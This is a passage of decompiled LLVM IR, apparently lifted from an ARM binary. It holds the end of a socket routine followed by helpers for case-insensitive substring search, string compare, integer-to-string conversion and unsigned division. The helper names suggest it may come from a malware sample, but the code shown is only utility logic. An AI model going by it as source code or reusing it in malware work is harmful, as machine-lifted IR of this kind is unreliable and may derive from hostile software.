  %v2_10410 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10414 = load i32, i32* @r5, align 4
  %v3_10418 = call i32 @__GI_getsockname(i32 %v0_10414, i32 %v2_103e8, i32 %v2_10410)
  %v0_1041c = load i32, i32* @r5, align 4
  %v1_10420 = call i32 @__GI___libc_close(i32 %v0_1041c)
  br label %dec_label_pc_10428

dec_label_pc_10428:                               ; preds = %bb, %dec_label_pc_103dc
  %storemerge = phi i32 [ 134744072, %dec_label_pc_103dc ], [ %v1_103d4, %bb ]
  store i32 %v3_103a0, i32* @r4, align 4
  store i32 %v6_103a0, i32* @r5, align 4
  store i32 %v9_103a0, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_103e8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_103c8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 8, 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 19, 20, 18, 4, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 3, 2, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10428, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10438 = load i8, i8* %tmp, align 1
  %v4_10438 = zext i8 %v3_10438 to i32
  store i32 %v4_10438, i32* @r3, align 4
  %v2_1043c = icmp eq i8 %v3_10438, 0
  br i1 %v2_1043c, label %bb, label %dec_label_pc_10450

bb:                                               ; preds = %entry
  br label %dec_label_pc_10464

dec_label_pc_10450:                               ; preds = %entry
  br label %dec_label_pc_10454

dec_label_pc_10454:                               ; preds = %dec_label_pc_10454, %dec_label_pc_10450
  %v0_10454 = phi i32 [ %v1_10454, %dec_label_pc_10454 ], [ 0, %dec_label_pc_10450 ]
  %v1_10454 = add i32 %v0_10454, 1
  %v2_10458 = add i32 %v1_10454, %arg2
  %v3_10458 = inttoptr i32 %v2_10458 to i8*
  %v4_10458 = load i8, i8* %v3_10458, align 1
  %v6_10458 = zext i8 %v4_10458 to i32
  store i32 %v6_10458, i32* @r3, align 4
  %v2_1045c = icmp eq i8 %v4_10458, 0
  br i1 %v2_1045c, label %dec_label_pc_10464, label %dec_label_pc_10454

dec_label_pc_10464:                               ; preds = %dec_label_pc_10454, %bb
  %v0_104a821 = phi i32 [ %v4_10438, %bb ], [ %v1_10454, %dec_label_pc_10454 ]
  %v0_1046c2 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_1046c2, 1
  br i1 %tmp29, label %dec_label_pc_104bc, label %dec_label_pc_10478

dec_label_pc_10478:                               ; preds = %dec_label_pc_10464, %dec_label_pc_1046c.backedge
  %v0_10470.in = phi i32 [ %v0_10470, %dec_label_pc_1046c.backedge ], [ %v0_1046c2, %dec_label_pc_10464 ]
  %v1_10484 = phi i32 [ %v1_1048415, %dec_label_pc_1046c.backedge ], [ 0, %dec_label_pc_10464 ]
  %v0_10478 = phi i32 [ %v5_10478, %dec_label_pc_1046c.backedge ], [ %tmp23, %dec_label_pc_10464 ]
  %v0_10470 = add i32 %v0_10470.in, -1
  %v1_10478 = inttoptr i32 %v0_10478 to i8*
  %v2_10478 = load i8, i8* %v1_10478, align 1
  %v3_10478 = zext i8 %v2_10478 to i32
  %v5_10478 = add i32 %v0_10478, 1
  %v1_1047c = add nsw i32 %v3_10478, -65
  %v2_10484 = add i32 %v1_10484, %arg2
  %v3_10484 = inttoptr i32 %v2_10484 to i8*
  %v4_10484 = load i8, i8* %v3_10484, align 1
  %v6_10484 = zext i8 %v4_10484 to i32
  store i32 %v6_10484, i32* @r3, align 4
  %v1_10488 = add nsw i32 %v6_10484, -65
  %tmp38 = icmp ult i32 %v1_1047c, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_10478
  %v5_1048c = or i32 %v3_10478, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_10478, %bb30
  %v0_10498 = phi i32 [ %v3_10478, %dec_label_pc_10478 ], [ %v5_1048c, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10488, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10494 = or i32 %v6_10484, 96
  store i32 %v5_10494, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10498 = phi i32 [ %v6_10484, %bb31 ], [ %v5_10494, %bb32 ]
  %v9_10498 = icmp eq i32 %v0_10498, %v1_10498
  br i1 %v9_10498, label %dec_label_pc_104a4, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_1046c.backedge

dec_label_pc_1046c.backedge:                      ; preds = %bb34, %dec_label_pc_104a4
  %v1_1048415 = phi i32 [ 0, %bb34 ], [ %v1_104a4, %dec_label_pc_104a4 ]
  %tmp35 = icmp slt i32 %v0_10470, 1
  br i1 %tmp35, label %dec_label_pc_104bc, label %dec_label_pc_10478

dec_label_pc_104a4:                               ; preds = %bb33
  %v1_104a4 = add i32 %v1_10484, 1
  %v9_104a8 = icmp eq i32 %v0_104a821, %v1_104a4
  br i1 %v9_104a8, label %dec_label_pc_104b0, label %dec_label_pc_1046c.backedge

dec_label_pc_104b0:                               ; preds = %dec_label_pc_104a4
  %v2_104b0 = sub i32 %v5_10478, %tmp23
  br label %dec_label_pc_104bc

dec_label_pc_104bc:                               ; preds = %dec_label_pc_1046c.backedge, %dec_label_pc_10464, %dec_label_pc_104b0
  %storemerge = phi i32 [ %v2_104b0, %dec_label_pc_104b0 ], [ -1, %dec_label_pc_10464 ], [ -1, %dec_label_pc_1046c.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_104a4, { 1, 0 }
  uselistorder i32 %v0_10478, { 1, 0 }
  uselistorder i32 %v1_10484, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 7, 6, 8, 3, 9, 4, 10, 5, 11, 12 }
  uselistorder label %dec_label_pc_104bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1046c.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_10478, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_104c4 = load i8, i8* %arg1, align 1
  %v2_104c8 = icmp eq i8 %v2_104c4, 0
  br i1 %v2_104c8, label %bb, label %dec_label_pc_104d4

bb:                                               ; preds = %entry
  %v3_104c4 = zext i8 %v2_104c4 to i32
  br label %dec_label_pc_104e8

dec_label_pc_104d4:                               ; preds = %entry
  br label %dec_label_pc_104d8

dec_label_pc_104d8:                               ; preds = %dec_label_pc_104d8, %dec_label_pc_104d4
  %v0_104d8 = phi i32 [ %v1_104d8, %dec_label_pc_104d8 ], [ 0, %dec_label_pc_104d4 ]
  %v1_104d8 = add i32 %v0_104d8, 1
  %v2_104dc = add i32 %v1_104d8, %tmp
  %v3_104dc = inttoptr i32 %v2_104dc to i8*
  %v4_104dc = load i8, i8* %v3_104dc, align 1
  %v2_104e0 = icmp eq i8 %v4_104dc, 0
  br i1 %v2_104e0, label %dec_label_pc_104e8, label %dec_label_pc_104d8

dec_label_pc_104e8:                               ; preds = %dec_label_pc_104d8, %bb
  %v0_105343 = phi i32 [ %v3_104c4, %bb ], [ %v1_104d8, %dec_label_pc_104d8 ]
  %v1_104e8 = inttoptr i32 %arg2 to i8*
  %v2_104e8 = load i8, i8* %v1_104e8, align 1
  %v3_104e8 = zext i8 %v2_104e8 to i32
  store i32 %v3_104e8, i32* @r3, align 4
  %v2_104ec = icmp eq i8 %v2_104e8, 0
  br i1 %v2_104ec, label %bb21, label %dec_label_pc_104f8

bb21:                                             ; preds = %dec_label_pc_104e8
  store i32 %v3_104e8, i32* @r2, align 4
  br label %dec_label_pc_1050c

dec_label_pc_104f8:                               ; preds = %dec_label_pc_104e8
  br label %dec_label_pc_104fc

dec_label_pc_104fc:                               ; preds = %dec_label_pc_104fc, %dec_label_pc_104f8
  %v0_104fc = phi i32 [ %v1_104fc, %dec_label_pc_104fc ], [ 0, %dec_label_pc_104f8 ]
  %v1_104fc = add i32 %v0_104fc, 1
  store i32 %v1_104fc, i32* @r2, align 4
  %v2_10500 = add i32 %v1_104fc, %arg2
  %v3_10500 = inttoptr i32 %v2_10500 to i8*
  %v4_10500 = load i8, i8* %v3_10500, align 1
  %v6_10500 = zext i8 %v4_10500 to i32
  store i32 %v6_10500, i32* @r3, align 4
  %v2_10504 = icmp eq i8 %v4_10500, 0
  br i1 %v2_10504, label %dec_label_pc_1050c, label %dec_label_pc_104fc

dec_label_pc_1050c:                               ; preds = %dec_label_pc_104fc, %bb21
  %v0_1050c = phi i32 [ %v3_104e8, %bb21 ], [ %v1_104fc, %dec_label_pc_104fc ]
  %v9_1050c = icmp eq i32 %v0_1050c, %v0_105343
  br i1 %v9_1050c, label %dec_label_pc_10534.preheader, label %dec_label_pc_10514

dec_label_pc_10534.preheader:                     ; preds = %dec_label_pc_1050c
  %v2_105345 = icmp eq i32 %v0_105343, 0
  br i1 %v2_105345, label %dec_label_pc_1053c, label %dec_label_pc_1051c

dec_label_pc_10514:                               ; preds = %dec_label_pc_1051c, %dec_label_pc_1050c
  ret i32 0

dec_label_pc_1051c:                               ; preds = %dec_label_pc_1052c, %dec_label_pc_10534.preheader
  %v0_10534.in = phi i32 [ %v0_10534, %dec_label_pc_1052c ], [ %v0_105343, %dec_label_pc_10534.preheader ]
  %v0_10530 = phi i32 [ %v1_10530, %dec_label_pc_1052c ], [ %arg2, %dec_label_pc_10534.preheader ]
  %v0_1052c = phi i32 [ %v1_1052c, %dec_label_pc_1052c ], [ %tmp, %dec_label_pc_10534.preheader ]
  %v0_10534 = add i32 %v0_10534.in, -1
  %v1_1051c = inttoptr i32 %v0_1052c to i8*
  %v2_1051c = load i8, i8* %v1_1051c, align 1
  %v3_1051c = zext i8 %v2_1051c to i32
  store i32 %v3_1051c, i32* @r2, align 4
  %v1_10520 = inttoptr i32 %v0_10530 to i8*
  %v2_10520 = load i8, i8* %v1_10520, align 1
  %v3_10520 = zext i8 %v2_10520 to i32
  store i32 %v3_10520, i32* @r3, align 4
  %v9_10524 = icmp eq i8 %v2_1051c, %v2_10520
  br i1 %v9_10524, label %dec_label_pc_1052c, label %dec_label_pc_10514

dec_label_pc_1052c:                               ; preds = %dec_label_pc_1051c
  %v1_1052c = add i32 %v0_1052c, 1
  %v1_10530 = add i32 %v0_10530, 1
  %v2_10534 = icmp eq i32 %v0_10534, 0
  br i1 %v2_10534, label %dec_label_pc_1053c, label %dec_label_pc_1051c

dec_label_pc_1053c:                               ; preds = %dec_label_pc_1052c, %dec_label_pc_10534.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_104fc, { 0, 1, 3, 2 }
  uselistorder i8 %v2_104c4, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_10548 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10548, i32* %r8.global-to-local, align 4
  %v2_10548 = icmp eq i32 %v0_10548, 0
  store i1 %v2_10548, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_10548, label %dec_label_pc_10628, label %dec_label_pc_10558

dec_label_pc_10558:                               ; preds = %entry
  %v3_10558 = icmp eq i8 %arg1, 0
  store i1 %v3_10558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10558, label %.thread, label %dec_label_pc_1056c

.thread:                                          ; preds = %dec_label_pc_10558
  %v4_10560 = inttoptr i32 %v0_10548 to i8*
  store i8 48, i8* %v4_10560, align 1
  %v0_10564.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10564.pr.pr, label %.thread1, label %dec_label_pc_1056c

.thread1:                                         ; preds = %.thread
  %v4_10564 = load i32, i32* %r8.global-to-local, align 4
  %v5_10564 = add i32 %v4_10564, 1
  %v6_10564 = inttoptr i32 %v5_10564 to i8*
  store i8 0, i8* %v6_10564, align 1
  %v0_10568.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10568.pr.pr, label %dec_label_pc_10628, label %dec_label_pc_1056c

dec_label_pc_1056c:                               ; preds = %dec_label_pc_10558, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_10570 = icmp eq i32 %arg2, 10
  store i1 %v7_10570, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10570, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_1056c
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_1056c
  %v4_1056c = zext i1 %tmp48 to i32
  store i32 %v4_1056c, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_105908 = sub nsw i32 0, %tmp
  %tmp.v3_105908 = select i1 %phitmp, i32 %tmp, i32 %v3_105908
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_105908, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_1059c = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_1059c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_105a0

dec_label_pc_105a0:                               ; preds = %bb46, %.thread6
  %v2_105c0 = phi i32 [ %v1_105cc, %bb46 ], [ 32, %.thread6 ]
  %v0_105b4 = phi i32 [ %v2_105c4, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_105a4 = load i32, i32* %r6.global-to-local, align 4
  %v3_105a8 = urem i32 %v0_105b4, %v0_105a4
  store i32 %v3_105a8, i32* %r1.global-to-local, align 4
  %v7_105ac = icmp eq i32 %v3_105a8, 9
  store i1 %v7_105ac, i1* %cpsr_z.global-to-local, align 1
  %v1_105b0 = add i32 %v3_105a8, 48
  store i32 %v0_105b4, i32* %r0.global-to-local, align 4
  %v7_105b8 = icmp sgt i32 %v3_105a8, 9
  %extract.t = trunc i32 %v1_105b0 to i8
  br i1 %v7_105b8, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_105a0
  %v9_105b8 = add i32 %v3_105a8, 55
  %extract.t28 = trunc i32 %v9_105b8 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_105a0, %bb45
  %v0_105c0.off0 = phi i8 [ %extract.t, %dec_label_pc_105a0 ], [ %extract.t28, %bb45 ]
  store i32 %v0_105a4, i32* %r1.global-to-local, align 4
  %v3_105c0 = load i32, i32* %r7.global-to-local, align 4
  %v4_105c0 = add i32 %v3_105c0, %v2_105c0
  %v5_105c0 = inttoptr i32 %v4_105c0 to i8*
  store i8 %v0_105c0.off0, i8* %v5_105c0, align 1
  %v0_105c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_105c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_105c4 = udiv i32 %v0_105c4, %v1_105c4
  store i32 %v2_105c4, i32* %r0.global-to-local, align 4
  %v2_105c8 = icmp ugt i32 %v1_105c4, %v0_105c4
  store i1 %v2_105c8, i1* %cpsr_z.global-to-local, align 1
  %v0_105cc = load i32, i32* %r5.global-to-local, align 4
  %v1_105cc = add i32 %v0_105cc, -1
  store i32 %v1_105cc, i32* %r5.global-to-local, align 4
  br i1 %v2_105c8, label %dec_label_pc_105d4, label %dec_label_pc_105a0

dec_label_pc_105d4:                               ; preds = %bb46
  %v0_105d4 = load i32, i32* %sl.global-to-local, align 4
  %v2_105d4 = icmp eq i32 %v0_105d4, 0
  store i1 %v2_105d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_105d4, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_105d4
  %v3_105d8 = ptrtoint i32* %stack_var_-32 to i32
  %v3_105dc = add i32 %v1_105cc, %v3_105d8
  store i32 %v3_105dc, i32* %r2.global-to-local, align 4
  %v4_105e4 = add i32 %v3_105dc, -34
  %v5_105e4 = inttoptr i32 %v4_105e4 to i8*
  store i8 45, i8* %v5_105e4, align 1
  %v0_105e8.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_105e8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_105e8.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_105d4
  %v1_105e8 = phi i32 [ %v1_105cc, %dec_label_pc_105d4 ], [ %v1_105e8.pre, %.thread11 ]
  %v2_105e8 = add i32 %v1_105e8, 1
  store i32 %v2_105e8, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_105f4 = phi i32 [ %v2_105e8, %.thread12 ], [ %v1_105e8.pre, %.thread11 ]
  %v0_105ec = load i32, i32* %r7.global-to-local, align 4
  %v2_105ec = add i32 %v0_105ec, %v1_105f4
  %v3_105ec = inttoptr i32 %v2_105ec to i8*
  %v4_105ec = load i8, i8* %v3_105ec, align 1
  %v6_105ec = zext i8 %v4_105ec to i32
  %v2_105f0 = icmp eq i8 %v4_105ec, 0
  store i1 %v2_105f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_105ec, i32* %r2.global-to-local, align 4
  br i1 %v2_105f0, label %dec_label_pc_10638, label %dec_label_pc_10600.preheader

dec_label_pc_10600.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10600

dec_label_pc_10600:                               ; preds = %dec_label_pc_10600.preheader, %dec_label_pc_10600
  %v0_10600 = phi i32 [ 0, %dec_label_pc_10600.preheader ], [ %v1_10600, %dec_label_pc_10600 ]
  %v1_10600 = add i32 %v0_10600, 1
  store i32 %v1_10600, i32* %r1.global-to-local, align 4
  %v2_10604 = add i32 %v1_10600, %v2_105ec
  %v3_10604 = inttoptr i32 %v2_10604 to i8*
  %v4_10604 = load i8, i8* %v3_10604, align 1
  %v2_10608 = icmp eq i8 %v4_10604, 0
  store i1 %v2_10608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10608, label %dec_label_pc_10610, label %dec_label_pc_10600

dec_label_pc_10610:                               ; preds = %dec_label_pc_10600, %dec_label_pc_10638
  %v0_1061425 = phi i32 [ %v6_105ec, %dec_label_pc_10638 ], [ %v1_10600, %dec_label_pc_10600 ]
  %v0_10610 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10610, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10614

dec_label_pc_10614:                               ; preds = %dec_label_pc_10614.dec_label_pc_10614_crit_edge, %dec_label_pc_10610
  %v2_10620 = phi i32 [ %v5_10620, %dec_label_pc_10614.dec_label_pc_10614_crit_edge ], [ %v0_10610, %dec_label_pc_10610 ]
  %v0_10618 = phi i32 [ %v0_10618.pre, %dec_label_pc_10614.dec_label_pc_10614_crit_edge ], [ %v2_105ec, %dec_label_pc_10610 ]
  %v0_10614 = phi i32 [ %v0_10614.pre, %dec_label_pc_10614.dec_label_pc_10614_crit_edge ], [ %v0_1061425, %dec_label_pc_10610 ]
  %v1_10614 = add i32 %v0_10614, -1
  store i32 %v1_10614, i32* %r1.global-to-local, align 4
  %v1_10618 = inttoptr i32 %v0_10618 to i8*
  %v2_10618 = load i8, i8* %v1_10618, align 1
  %v5_10618 = add i32 %v0_10618, 1
  store i32 %v5_10618, i32* %r2.global-to-local, align 4
  %v3_1061c = icmp eq i32 %v0_10614, 0
  store i1 %v3_1061c, i1* %cpsr_z.global-to-local, align 1
  %v3_10620 = inttoptr i32 %v2_10620 to i8*
  store i8 %v2_10618, i8* %v3_10620, align 1
  %v4_10620 = load i32, i32* %r0.global-to-local, align 4
  %v5_10620 = add i32 %v4_10620, 1
  store i32 %v5_10620, i32* %r0.global-to-local, align 4
  br i1 %v3_1061c, label %dec_label_pc_10628, label %dec_label_pc_10614.dec_label_pc_10614_crit_edge

dec_label_pc_10614.dec_label_pc_10614_crit_edge:  ; preds = %dec_label_pc_10614
  %v0_10614.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10618.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10614

dec_label_pc_10628:                               ; preds = %dec_label_pc_10614, %.thread1, %entry
  %v0_10628 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10628, i32* %r0.global-to-local, align 4
  ret i32 %v0_10628

dec_label_pc_10638:                               ; preds = %.thread11._crit_edge
  store i32 %v6_105ec, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10610

; uselistorder directives
  uselistorder i32 %v5_10620, { 1, 0 }
  uselistorder i1 %v3_1061c, { 1, 0 }
  uselistorder i32 %v0_10618, { 1, 0 }
  uselistorder i32 %v1_10600, { 0, 1, 3, 2 }
  uselistorder i32 %v6_105ec, { 1, 0 }
  uselistorder i32 %v2_105ec, { 1, 0, 2, 3 }
  uselistorder i32 %v1_105e8.pre, { 1, 0 }
  uselistorder i32 %v1_105cc, { 1, 0, 3, 2 }
  uselistorder i32 %v2_105c4, { 1, 0 }
  uselistorder i32 %v3_105a8, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_10548, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 6, 7, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10610, { 1, 0 }
  uselistorder label %dec_label_pc_10600, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_1056c, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_10640 = load i32, i32* @r1, align 4
  %v1_10640 = add i32 %v0_10640, -1
  store i32 %v1_10640, i32* %r2.global-to-local, align 4
  %v2_10640 = icmp eq i32 %v0_10640, 0
  %v7_10640 = icmp eq i32 %v0_10640, 1
  %v0_10644 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_10640, i32 %v0_10644)
  br i1 %v2_10640, label %dec_label_pc_10728, label %dec_label_pc_1064c

dec_label_pc_1064c:                               ; preds = %entry
  %v0_1064c = load i32, i32* %r0.global-to-local, align 4
  %v1_1064c = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_1064c, %v1_1064c
  br i1 %tmp, label %dec_label_pc_10654, label %dec_label_pc_106e0

dec_label_pc_10654:                               ; preds = %dec_label_pc_1064c
  %v1_10654 = load i32, i32* %r2.global-to-local, align 4
  %v2_10654 = and i32 %v1_10654, %v1_1064c
  %v4_10654 = icmp eq i32 %v2_10654, 0
  br i1 %v4_10654, label %dec_label_pc_106ec, label %dec_label_pc_1065c

dec_label_pc_1065c:                               ; preds = %dec_label_pc_10654
  %v3_1065c = icmp ult i32 %v1_1064c, 536870912
  br i1 %v3_1065c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1065c
  %v4_10660 = mul i32 %v1_1064c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1065c, %.thread
  %v0_10680.pr36.ph = phi i32 [ %v4_10660, %.thread ], [ %v1_1064c, %dec_label_pc_1065c ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1065c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_10680.pr36 = phi i32 [ %v4_10674, %bb81 ], [ %v0_10680.pr36.ph, %.preheader.preheader ]
  %v1_10678 = phi i32 [ %v4_10678, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_1066c = icmp ugt i32 %v0_10680.pr36, 268435455
  br i1 %v2_1066c, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_10680thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_10670 = icmp ult i32 %v0_10680.pr36, %v0_1064c
  br i1 %v4_10670, label %bb80, label %dec_label_pc_10680thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_10674 = and i32 %v0_10680.pr36, 268435456
  %v3_10674 = icmp eq i32 %v2_10674, 0
  %v4_10674 = mul i32 %v0_10680.pr36, 16
  br i1 %v3_10674, label %bb81, label %dec_label_pc_10680.loopexit

bb81:                                             ; preds = %bb80
  %v2_10678 = and i32 %v1_10678, 268435456
  %v3_10678 = icmp eq i32 %v2_10678, 0
  %v4_10678 = mul i32 %v1_10678, 16
  br i1 %v3_10678, label %.preheader, label %dec_label_pc_10680thread-pre-split.loopexit.loopexit

dec_label_pc_10680thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1068c48.ph = phi i32 [ %v1_10678, %bb ], [ %v4_10678, %bb81 ]
  %v0_10680.pr38.ph = phi i32 [ %v0_10680.pr36, %bb ], [ %v4_10674, %bb81 ]
  br label %dec_label_pc_10680thread-pre-split.loopexit

dec_label_pc_10680thread-pre-split.loopexit:      ; preds = %dec_label_pc_10680thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1068c48 = phi i32 [ %v1_10678, %.thread2 ], [ %v1_1068c48.ph, %dec_label_pc_10680thread-pre-split.loopexit.loopexit ]
  %v0_10680.pr38 = phi i32 [ %v0_10680.pr36, %.thread2 ], [ %v0_10680.pr38.ph, %dec_label_pc_10680thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_10680thread-pre-split

dec_label_pc_10680thread-pre-split:               ; preds = %dec_label_pc_10680thread-pre-split.loopexit, %bb83
  %v1_1068c46 = phi i32 [ %v1_1068c48, %dec_label_pc_10680thread-pre-split.loopexit ], [ %v3_1068c, %bb83 ]
  %v0_10680.pr = phi i32 [ %v0_10680.pr38, %dec_label_pc_10680thread-pre-split.loopexit ], [ %v3_10688, %bb83 ]
  br label %dec_label_pc_10680

dec_label_pc_10680.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_10680

dec_label_pc_10680:                               ; preds = %dec_label_pc_10680.loopexit, %dec_label_pc_10680thread-pre-split
  %v1_1068c = phi i32 [ %v1_1068c46, %dec_label_pc_10680thread-pre-split ], [ %v1_10678, %dec_label_pc_10680.loopexit ]
  %v1_10688 = phi i32 [ %v0_10680.pr, %dec_label_pc_10680thread-pre-split ], [ %v4_10674, %dec_label_pc_10680.loopexit ]
  %v2_10680 = icmp slt i32 %v1_10688, 0
  br i1 %v2_10680, label %dec_label_pc_10694, label %bb82

bb82:                                             ; preds = %dec_label_pc_10680
  %v4_10684 = icmp ult i32 %v1_10688, %v0_1064c
  br i1 %v4_10684, label %bb83, label %dec_label_pc_10694

bb83:                                             ; preds = %bb82
  %v3_10688 = mul i32 %v1_10688, 2
  %v2_1068c = icmp slt i32 %v1_1068c, 0
  %v3_1068c = mul i32 %v1_1068c, 2
  br i1 %v2_1068c, label %dec_label_pc_10694, label %dec_label_pc_10680thread-pre-split

dec_label_pc_10694:                               ; preds = %bb82, %dec_label_pc_10680, %bb83
  %v2_106a059 = phi i32 [ %v3_1068c, %bb83 ], [ %v1_1068c, %bb82 ], [ %v1_1068c, %dec_label_pc_10680 ]
  %v1_1069851 = phi i32 [ %v3_10688, %bb83 ], [ %v1_10688, %bb82 ], [ %v1_10688, %dec_label_pc_10680 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %.thread11, %dec_label_pc_10694
  %v1_106cc = phi i32 [ %v4_106cc, %.thread11 ], [ %v2_106a059, %dec_label_pc_10694 ]
  %v1_106a0 = phi i32 [ %v0_106d8, %.thread11 ], [ 0, %dec_label_pc_10694 ]
